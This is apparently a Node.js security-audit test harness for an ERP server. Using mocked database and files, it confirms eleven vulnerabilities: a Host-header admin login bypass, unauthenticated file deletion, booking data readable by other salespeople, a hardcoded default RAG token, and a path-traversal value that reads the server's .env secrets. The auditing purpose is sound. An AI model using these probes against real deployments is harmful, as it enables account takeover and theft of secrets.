// Isolated audit probes. Real controllers/middleware; fake DB, files, and integrations.
// Never import server/index.js or load .env. No production data is accessed.
const path = require('node:path');
const Module = require('node:module');
const crypto = require('node:crypto');
const assert = require('node:assert/strict');
const root = path.resolve(__dirname, '../..');
const express = require(path.join(root, 'server/node_modules/express'));
const request = require(path.join(root, 'node_modules/supertest'));
const jwt = require(path.join(root, 'server/node_modules/jsonwebtoken'));
const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
  publicKeyEncoding: { type: 'spki', format: 'pem' }
});
process.env.JWT_PRIVATE_KEY = Buffer.from(privateKey).toString('base64');
process.env.JWT_PUBLIC_KEY = Buffer.from(publicKey).toString('base64');
process.env.JWT_ACTIVE_KID = 'isolated-audit';
process.env.JWT_PUBLIC_KEYS = '';
delete process.env.RAG_API_KEY;
let queryHandler = async () => ({ rows: [], rowCount: 0 });
const queries = [];
const db = {
  query: async (sql, args) => { queries.push({ sql, args }); return queryHandler(sql, args); },
  pool: { connect: async () => ({ query: (...args) => db.query(...args), release() {} }) }
};
const deleted = [];
const readPaths = [];
const fakeFs = {
  existsSync: () => true,
  mkdirSync() {},
  unlinkSync: p => deleted.push(p),
  readdirSync: () => [],
  readFileSync: p => { readPaths.push(p); return 'FAKE FILE CONTENT'; }
};
const originalLoad = Module._load;
Module._load = function (name, parent, ...args) {
  const fromServer = parent?.filename.startsWith(path.join(root, 'server'));
  if (fromServer && /(^|\/)db$/.test(name)) return db;
  if (fromServer && name.endsWith('/utils/logger')) return { logActivity: async () => {} };
  if (fromServer && name.endsWith('/utils/eventBus')) return { emitEvent() {} };
  if (fromServer && name.includes('/services/')) return {};
  if ([path.join(root, 'server/routes/media.js'), path.join(root, 'server/controllers/ragController.js')].includes(parent?.filename) && name === 'fs') return fakeFs;
  // Mount actual Zalo router while preventing ALL real outbound controller actions.
  if (parent?.filename === path.join(root, 'server/routes/zalo_v2.js') && name.includes('zaloV2Controller')) {
    return new Proxy({}, { get: (_, action) => (req, res) => res.json({ reached: action }) });
  }
  return originalLoad.call(this, name, parent, ...args);
};
const load = file => require(path.join(root, 'server', file));
const authController = load('controllers/authController');
const userController = load('controllers/userController');
const bookings = load('controllers/bookingController');
const perms = load('middleware/permCheck');
const auth = load('middleware/auth');
const tokens = load('utils/jwt');
const salesToken = tokens.generateAccessToken({ id: 101, role: 'sales' });
const app = express();
app.set('trust proxy', 1);
app.use(express.json());
app.post('/dev-login', authController.devLogin);
app.use('/media', load('routes/media'));
app.use('/contracts', load('routes/publicContracts'));
app.use('/zalo', load('routes/zalo_v2'));
app.put('/users/:id', auth, userController.updateUser);
app.get('/permission-any', auth, perms.permCheckAny([['bookings', 'view_own']]), (_, res) => res.json({ allowed: true }));
app.get('/booking/:id', auth, perms.permCheckAny([['bookings', 'view_own']]), bookings.getBookingById);
app.get('/jwt-only', auth, (_, res) => res.json({ allowed: true }));
app.get('/rag', load('middleware/ragAuth'), (_, res) => res.json({ allowed: true }));
app.get('/rag-content', load('middleware/ragAuth'), load('controllers/ragController').getDocContent);
let count = 0;
async function probe(name, run) {
  queries.length = 0;
  await run();
  count++;
  console.log(`CONFIRMED ${count}: ${name}`);
}
async function main() {
  await probe('Production dev-login grants admin for attacker-controlled localhost Host', async () => {
    process.env.NODE_ENV = 'production';
    queryHandler = async () => ({ rows: [{ id: 1, username: 'admin', role_name: 'admin' }] });
    const denied = await request(app).post('/dev-login').set('Host', 'erp.example.invalid').set('X-Forwarded-For', '203.0.113.7');
    assert.equal(denied.status, 403);
    const res = await request(app).post('/dev-login').set('Host', 'localhost').set('X-Forwarded-For', '203.0.113.7');
    assert.equal(res.status, 200);
    assert.equal(tokens.verifyTokenSafely(res.body.token).role, 'admin');
  });
  await probe('Unauthenticated media bulk-delete reaches filesystem deletion', async () => {
    const res = await request(app).post('/media/bulk-delete').send({ filenames: ['audit-fake.txt'] });
    assert.equal(res.status, 200);
    assert.equal(res.body.deletedCount, 1);
    assert.ok(deleted[0].endsWith('/receipts/audit-fake.txt'));
  });
  await probe('Unauthenticated public contract exposes fake customer and voucher data by IDs', async () => {
    queryHandler = async sql => ({ rows: sql.includes('FROM tour_departures') ? [{ id: 9 }] : sql.includes('FROM bookings') ? [{ id: 99, customer_name: 'FAKE CUSTOMER', raw_details: {} }] : [{ amount: 100 }] });
    const res = await request(app).get('/contracts/9/99');
    assert.equal(res.status, 200);
    assert.equal(res.body.booking.customer_name, 'FAKE CUSTOMER');
    assert.equal(res.body.vouchers[0].amount, 100);
  });
  await probe('Zalo router permits unauthenticated read/send/delete controller dispatch (controllers stubbed)', async () => {
    for (const [method, url, action] of [['get', '/zalo/sandbox/messages', 'getSandboxMessages'], ['post', '/zalo/sandbox/reply', 'replySandboxMessage'], ['delete', '/zalo/sandbox/messages/fake', 'deleteSandboxMessages']]) {
      const res = await request(app)[method](url);
      assert.equal(res.status, 200);
      assert.equal(res.body.reached, action);
    }
  });
  await probe('Sales user can update another user with unchanged admin role_id', async () => {
    queryHandler = async sql => ({ rows: sql.includes('SELECT role_id FROM users') ? [{ role_id: 1 }] : [], rowCount: sql.includes('UPDATE users') ? 1 : 0 });
    const res = await request(app).put('/users/1').set('Authorization', `Bearer ${salesToken}`).send({ full_name: 'FAKE ADMIN', email: 'fake@example.invalid', role_id: 1, is_active: false });
    assert.equal(res.status, 200);
    assert.ok(queries.some(q => q.sql.includes('UPDATE users SET') && q.args[5] === '1' && q.args[4] === false));
  });
  await probe('permCheckAny ignores explicit user deny when role grants same permission', async () => {
    queryHandler = async sql => ({ rows: sql.includes('permissions_master') ? [{ id: 55, module: 'bookings', action: 'view_own' }] : sql.includes('user_permissions_v2') ? [{ granted: false }] : sql.includes('SELECT role_id') ? [{ role_id: 3 }] : [{ granted: true }] });
    const res = await request(app).get('/permission-any').set('Authorization', `Bearer ${salesToken}`);
    assert.equal(res.status, 200);
  });
  await probe('view_own user reads fake booking belonging to another sale_id', async () => {
    queryHandler = async sql => ({ rows: sql.includes('user_permissions_v2') ? [{ granted: true }] : sql.includes('SELECT b.*') ? [{ id: 999, sale_id: 202, public_token: 'fake-public-token' }] : [] });
    const res = await request(app).get('/booking/999').set('Authorization', `Bearer ${salesToken}`);
    assert.equal(res.status, 200);
    assert.equal(res.body.sale_id, 202);
  });
  await probe('Valid signed admin JWT accepted without checking disabled/deleted account in DB', async () => {
    queryHandler = async () => { throw new Error('Auth should query live status'); };
    const token = tokens.generateAccessToken({ id: 1, role: 'admin', is_active: false });
    const res = await request(app).get('/jwt-only').set('Authorization', `Bearer ${token}`);
    assert.equal(res.status, 200);
    assert.equal(queries.length, 0);
  });
  await probe('Signed JWT without expiry or typ accepted', async () => {
    const token = jwt.sign({ id: 101, iss: 'https://erp.fittour.vn', aud: 'fittour-api' }, privateKey, { algorithm: 'RS256', keyid: 'isolated-audit' });
    assert.equal(tokens.verifyTokenSafely(token).id, 101);
  });
  await probe('RAG uses publicly known default credential when env secret missing', async () => {
    const res = await request(app).get('/rag').set('Authorization', 'Bearer fittour-rag-secret-token-2026');
    assert.equal(res.status, 200);
  });
  await probe('RAG sotay path escapes document directory and reads mocked server secret file', async () => {
    const res = await request(app).get('/rag-content').query({ id: 'sotay_../server/.env' }).set('Authorization', 'Bearer fittour-rag-secret-token-2026');
    assert.equal(res.status, 200);
    assert.equal(res.body.content, 'FAKE FILE CONTENT');
    assert.equal(readPaths.at(-1), path.join(root, 'server/.env'));
  });
  console.log(`\n${count} isolated probes confirmed current behavior. This is evidence of defects, NOT a security PASS.`);
}
main().catch(err => { console.error(err); process.exitCode = 1; });
